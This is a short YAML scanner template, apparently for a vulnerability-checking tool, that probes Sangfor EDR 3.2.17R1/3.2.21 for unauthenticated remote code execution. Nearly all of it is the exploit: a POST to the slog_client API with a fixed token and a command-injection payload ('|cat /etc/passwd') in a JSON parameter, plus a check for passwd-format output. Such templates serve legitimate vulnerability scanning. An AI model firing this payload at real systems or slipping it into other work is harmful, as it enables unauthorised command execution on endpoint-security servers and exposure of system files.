expression: r0()
id: sangfor-edr-cssp-rce
info:
  author: pikpikcu
  description: 'Sangfor EDR 3.2.17R1/3.2.21 allows remote unauthenticated users to
    to execute arbitrary commands.

    app="sangfor"

    '
  name: Sangfor EDR 3.2.17R1/3.2.21 - Remote Code Execution
  reference:
  - https://www.cnblogs.com/0day-li/p/13650452.html
  severity: critical
  verified: false
rules:
  r0:
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      body: '{"params":"w=123\"''1234123''\"|cat /etc/passwd"}

        '
      method: POST
      path: /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
